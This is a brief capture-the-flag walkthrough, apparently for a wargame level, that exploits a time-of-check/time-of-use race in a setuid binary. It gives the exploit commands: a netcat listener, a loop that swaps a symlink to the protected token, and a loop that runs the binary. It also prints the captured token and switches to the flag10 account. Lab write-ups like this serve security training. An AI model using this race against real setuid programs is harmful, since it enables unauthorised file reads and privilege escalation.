# level10

```bash
ls -l
# -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
# -rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

With gdb we can see calls to `access` then `open`: \
[c access function vulnerability](https://stackoverflow.com/questions/7925177/access-security-hole) \
[TOC/TOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)

```bash
nc -lk 6969
while true; do echo "fake" > /tmp/a; ln -sf /tmp/a /tmp/token; ln -sf ~/token /tmp/token; done
while true; do ./level10 /tmp/token 127.0.0.1; done
# .*( )*.
# woupa2yuojeeaaed06riuj63c

su flag10
```
